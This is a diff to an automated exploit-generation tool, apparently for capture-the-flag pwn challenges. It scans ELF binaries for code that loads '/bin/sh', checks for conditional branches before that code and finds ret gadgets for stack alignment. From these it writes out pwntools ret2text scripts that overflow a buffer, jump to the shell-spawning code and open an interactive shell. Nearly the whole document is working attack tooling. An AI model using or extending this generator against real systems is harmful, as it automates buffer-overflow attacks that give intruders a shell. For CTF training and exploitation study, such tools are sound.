@@ -1803,40 +1803,108 @@ p.interactive()
                     if text_data[i] == 0x48 and text_data[i+1] == 0x8d and text_data[i+2] == 0x3d:
                         disp = struct.unpack('<i', text_data[i+3:i+7])[0]
                         insn_vaddr = text_vaddr + i
-                        target = insn_vaddr + 7 + disp  # RIP-relative: RIP points to next insn
+                        target = insn_vaddr + 7 + disp
                         if target == bin_sh_vaddr:
-                            # 回溯查找函数起始（找 push rbp 或 endbr64）
                             func_start = self._find_func_start_64(text_data, i, text_vaddr)
-                            return (func_start if func_start else insn_vaddr,
-                                    f"lea rdi, [rip+0x{disp & 0xFFFFFFFF:x}]  ; /bin/sh @ 0x{bin_sh_vaddr:x}")
-                    # MOV EDI, imm32 (加载 /bin/sh 地址到 edi — 用于小地址)
+                            has_cond = self._has_conditional_jump(text_data, i, func_start, text_vaddr) if func_start else False
+                            # 检测 lea rdi 后面是否跟着 call（决定是否需要 ret gadget）
+                            uses_call = self._next_is_call(text_data, i + 7)
+                            desc = f"lea rdi, [rip+0x{disp & 0xFFFFFFFF:x}]  ; /bin/sh @ 0x{bin_sh_vaddr:x}"
+                            return {
+                                'insn_addr': insn_vaddr,
+                                'func_addr': func_start,
+                                'has_conditional': has_cond,
+                                'uses_call': uses_call,
+                                'description': desc,
+                            }
+                    # MOV EDI, imm32
                     if text_data[i] == 0xbf:
                         imm = struct.unpack('<I', text_data[i+1:i+5])[0]
                         if imm == (bin_sh_vaddr & 0xFFFFFFFF):
                             insn_vaddr = text_vaddr + i
                             func_start = self._find_func_start_64(text_data, i, text_vaddr)
-                            return (func_start if func_start else insn_vaddr,
-                                    f"mov edi, 0x{imm:x}  ; /bin/sh @ 0x{bin_sh_vaddr:x}")
+                            has_cond = self._has_conditional_jump(text_data, i, func_start, text_vaddr) if func_start else False
+                            uses_call = self._next_is_call(text_data, i + 5)
+                            desc = f"mov edi, 0x{imm:x}  ; /bin/sh @ 0x{bin_sh_vaddr:x}"
+                            return {
+                                'insn_addr': insn_vaddr,
+                                'func_addr': func_start,
+                                'has_conditional': has_cond,
+                                'uses_call': uses_call,
+                                'description': desc,
+                            }
             else:
-                # 32 位: 搜索 push <bin_sh_addr> (68 xx xx xx xx)
-                # 或 mov dword [esp], <bin_sh_addr> (c7 04 24 xx xx xx xx)
                 bin_sh_bytes = struct.pack('<I', bin_sh_vaddr)
                 for i in range(len(text_data) - 5):
-                    # push imm32
                     if text_data[i] == 0x68 and text_data[i+1:i+5] == bin_sh_bytes:
                         insn_vaddr = text_vaddr + i
                         func_start = self._find_func_start_32(text_data, i, text_vaddr)
-                        return (func_start if func_start else insn_vaddr,
-                                f"push 0x{bin_sh_vaddr:x}  ; /bin/sh")
-                    # mov dword [esp], imm32
+                        uses_call = self._next_is_call(text_data, i + 5)
+                        return {
+                            'insn_addr': insn_vaddr,
+                            'func_addr': func_start,
+                            'has_conditional': False,
+                            'uses_call': uses_call,
+                            'description': f"push 0x{bin_sh_vaddr:x}  ; /bin/sh",
+                        }
                     if (i + 7 <= len(text_data) and
                             text_data[i] == 0xc7 and text_data[i+1] == 0x04 and
                             text_data[i+2] == 0x24 and text_data[i+3:i+7] == bin_sh_bytes):
                         insn_vaddr = text_vaddr + i
                         func_start = self._find_func_start_32(text_data, i, text_vaddr)
-                        return (func_start if func_start else insn_vaddr,
-                                f"mov dword [esp], 0x{bin_sh_vaddr:x}  ; /bin/sh")
+                        uses_call = self._next_is_call(text_data, i + 7)
+                        return {
+                            'insn_addr': insn_vaddr,
+                            'func_addr': func_start,
+                            'has_conditional': False,
+                            'uses_call': uses_call,
+                            'description': f"mov dword [esp], 0x{bin_sh_vaddr:x}  ; /bin/sh",
+                        }
 
+        return None
+
+    def _has_conditional_jump(self, text_data, target_pos, func_start_vaddr, text_vaddr):
+        """检测从函数入口到 target 指令之间是否存在条件跳转（jne/je/jg/jl 等）"""
+        if not func_start_vaddr:
+            return False
+        start_offset = func_start_vaddr - text_vaddr
+        # 条件跳转操作码: 0x70-0x7F (短跳) 和 0x0F 0x80-0x8F (近跳)
+        cond_jump_short = set(range(0x70, 0x80))
+        for i in range(start_offset, min(target_pos, len(text_data) - 1)):
+            if text_data[i] in cond_jump_short:
+                return True
+            if text_data[i] == 0x0F and i + 1 < len(text_data) and 0x80 <= text_data[i+1] <= 0x8F:
+                return True
+        return False
+
+    def _next_is_call(self, text_data, pos):
+        """检测 pos 位置之后的几条指令中是否有 call（0xe8 近跳或 0xff /2 间接）"""
+        # 在接下来的 16 字节内搜索 call 指令
+        for j in range(pos, min(pos + 16, len(text_data))):
+            # 0xe8 = call rel32 (近跳)
+            if text_data[j] == 0xe8:
+                return True
+            # 0xff /2 = call [reg] 或 call [mem]（间接调用）
+            if text_data[j] == 0xff and j + 1 < len(text_data):
+                modrm = text_data[j + 1]
+                reg_field = (modrm >> 3) & 7
+                if reg_field == 2:  # /2 = call
+                    return True
+            # 遇到 ret (0xc3) 或 jmp (0xe9/0xeb) 就停止搜索
+            if text_data[j] in (0xc3, 0xe9, 0xeb):
+                break
+        return False
+
+    def _elf_find_ret_gadget(self, data, info, sections):
+        """在 .text 段搜索 ret (0xc3) gadget 地址，用于栈对齐"""
+        text_sec = self._elf_find_text_section(sections)
+        if not text_sec:
+            return None
+        text_data = data[text_sec['sh_offset']:text_sec['sh_offset'] + text_sec['sh_size']]
+        text_vaddr = text_sec['sh_addr']
+        for i in range(len(text_data)):
+            if text_data[i] == 0xc3:
+                return text_vaddr + i
         return None
 
     def _find_func_start_64(self, text_data: bytes, pos: int, text_vaddr: int):
@@ -2033,13 +2101,27 @@ p.interactive()
 
         # 6. 搜索后门目标地址（加载 /bin/sh 的指令）
         backdoor_target = self._elf_find_backdoor_target(data, info, sections, phdrs)
+        uses_call = False
         if backdoor_target:
-            target_addr, target_desc = backdoor_target
+            insn_addr = backdoor_target['insn_addr']
+            func_addr = backdoor_target['func_addr']
+            has_cond = backdoor_target['has_conditional']
+            uses_call = backdoor_target.get('uses_call', False)
+            target_desc = backdoor_target['description']
+
             lines.append("\n[+] Backdoor target found!")
-            lines.append(f"    Address: 0x{target_addr:x}")
             lines.append(f"    Instruction: {target_desc}")
+            lines.append(f"    Instruction address: 0x{insn_addr:x}")
+            if func_addr and func_addr != insn_addr:
+                lines.append(f"    Function entry: 0x{func_addr:x}")
+            if has_cond:
+                lines.append("    [!] Conditional branch detected between function entry and target!")
+                lines.append(f"        -> Jump directly to 0x{insn_addr:x} to skip the check")
+            if uses_call:
+                lines.append("    [*] Target uses 'call system' (not ret-into-system)")
+                lines.append("        -> No ret gadget needed (call handles stack alignment)")
+            final_target = insn_addr
         else:
-            # 如果没找到 lea/mov 指令但有 system 和 /bin/sh，尝试其他方式
             if backdoor_funcs and bin_sh_found:
                 lines.append("\n[~] system() and /bin/sh found, but no direct backdoor function detected")
                 lines.append("    Consider using ret2libc approach")
@@ -2047,6 +2129,17 @@ p.interactive()
                 lines.append("\n[-] No backdoor target found (no /bin/sh loading instruction)")
                 lines.append("    ret2text may not be applicable for this binary")
                 return "\n".join(lines)
+            final_target = None
+
+        # 6b. 搜索 ret gadget（仅当目标不使用 call 时才需要）
+        ret_gadget = None
+        need_ret = is_64 and not uses_call
+        if need_ret:
+            ret_gadget = self._elf_find_ret_gadget(data, info, sections)
+            if ret_gadget:
+                lines.append(f"\n[*] ret gadget found: 0x{ret_gadget:x} (for stack alignment)")
+            else:
+                lines.append("\n[~] No ret gadget found (may need manual alignment)")
 
         # 7. 计算缓冲区偏移
         buf_info = self._elf_estimate_buffer_offset(data, info, sections, symbols)
@@ -2064,7 +2157,24 @@ p.interactive()
         connect_code = self._generate_connect_code(remote_info, filepath)
 
         offset_val = offset if offset else "0x00  # TODO: fill in the correct offset"
-        target_val = f"0x{backdoor_target[0]:x}" if backdoor_target else "0x0  # TODO: fill in backdoor address"
+        target_val = f"0x{final_target:x}" if final_target else "0x0  # TODO: fill in backdoor address"
+
+        # 构造 payload — 根据 uses_call 决定是否加 ret gadget
+        if need_ret and ret_gadget:
+            # 目标通过 ret 进入 system → 需要 ret gadget 对齐
+            ret_line = f"ret = 0x{ret_gadget:x}           # ret gadget (stack alignment)"
+            payload_build = (
+                f"payload = b'A' * offset\n"
+                f"payload += {p_func}(ret)           # stack alignment (x64 movaps)\n"
+                f"payload += {p_func}(target)"
+            )
+        else:
+            # 目标通过 call 调用 system → 不需要 ret gadget
+            ret_line = "# No ret gadget needed (target uses 'call system')" if uses_call else ""
+            payload_build = (
+                f"payload = b'A' * offset\n"
+                f"payload += {p_func}(target)"
+            )
 
         exploit = f'''
 #!/usr/bin/env python3
@@ -2077,18 +2187,30 @@ context.log_level = 'debug'
 {connect_code}
 elf = ELF('./{basename}')
 
-# Backdoor / target address
+# Backdoor / target address (instruction, not function entry)
 target = {target_val}
+{ret_line}
 
 # Buffer overflow offset
 offset = {offset_val}
 
 # Build payload
-payload = b'A' * offset
-payload += {p_func}(target)
+{payload_build}
 
 # Send payload
-p.recvuntil(b'> ')  # TODO: adjust the recv pattern
+# Common recv patterns (uncomment the one that matches, or add your own):
+# p.recvuntil(b'Input')
+# p.recvuntil(b'input')
+# p.recvuntil(b'Please input')
+# p.recvuntil(b'Enter')
+# p.recvuntil(b'>')
+# p.recvuntil(b': ')
+# p.recvuntil(b'?\n')
+# p.recvuntil(b'name')
+# p.recvuntil(b'buf')
+# p.recvuntil(b'bof')
+# p.recvuntil(b'Welcome')
+p.recvuntil(b':')  # <-- adjust to match the server prompt
 p.sendline(payload)
 
 p.interactive()
@@ -2312,9 +2434,14 @@ p.interactive()
         # 搜索后门目标
         backdoor_target = self._elf_find_backdoor_target(data, info, sections, phdrs)
         if backdoor_target:
+            bt = backdoor_target
             lines.append("\n--- Backdoor Target ---")
-            lines.append(f"  [+] Target: 0x{backdoor_target[0]:x}")
-            lines.append(f"  [+] Detail: {backdoor_target[1]}")
+            lines.append(f"  [+] Instruction: 0x{bt['insn_addr']:x}")
+            if bt.get('func_addr') and bt['func_addr'] != bt['insn_addr']:
+                lines.append(f"  [+] Function entry: 0x{bt['func_addr']:x}")
+            if bt.get('has_conditional'):
+                lines.append("  [!] Conditional branch detected -> jumping to instruction address")
+            lines.append(f"  [+] Detail: {bt['description']}")
 
         # 7. 缓冲区偏移
         buf_info = self._elf_estimate_buffer_offset(data, info, sections, symbols)
@@ -2408,7 +2535,29 @@ p.interactive()
         offset_val = offset if offset else "0x00  # TODO: determine with pattern"
 
         if route_chosen == "ret2text" and backdoor_target:
-            target_addr = backdoor_target[0]
+            bt = backdoor_target
+            target_addr = bt['insn_addr'] if isinstance(bt, dict) else bt[0]
+            bt_uses_call = bt.get('uses_call', False) if isinstance(bt, dict) else False
+            # ret gadget: 仅当目标不使用 call 时才需要
+            need_ret = is_64 and not bt_uses_call
+            ret_gadget = self._elf_find_ret_gadget(data, info, sections) if need_ret else None
+            if ret_gadget:
+                ret_line = f"ret = 0x{ret_gadget:x}           # ret gadget (stack alignment)"
+            elif bt_uses_call:
+                ret_line = "# No ret gadget needed (target uses 'call system')"
+            else:
+                ret_line = ""
+            if need_ret and ret_gadget:
+                payload_code = (
+                    "payload = b'A' * offset\n"
+                    "payload += p64(ret)           # stack alignment\n"
+                    "payload += p64(target)"
+                )
+            else:
+                payload_code = (
+                    f"payload = b'A' * offset\n"
+                    f"payload += {p_func}(target)"
+                )
             exploit = f'''
 #!/usr/bin/env python3
 # auto_pwn exploit - ret2text for {basename}
@@ -2420,18 +2569,21 @@ context.log_level = 'debug'
 {connect_code}
 elf = ELF('./{basename}')
 
-# Backdoor target address
+# Backdoor target address (instruction, not function entry)
 target = 0x{target_addr:x}
+{ret_line}
 
 # Buffer overflow offset
 offset = {offset_val}
 
 # Build payload
-payload = b'A' * offset
-payload += {p_func}(target)
+{payload_code}
 
-# Send
-p.recvuntil(b'> ')  # TODO: adjust
+# Send (uncomment the matching pattern):
+# p.recvuntil(b'Input')
+# p.recvuntil(b'>')
+# p.recvuntil(b': ')
+p.recvuntil(b':')  # <-- adjust to match server prompt
 p.sendline(payload)
 
 p.interactive()
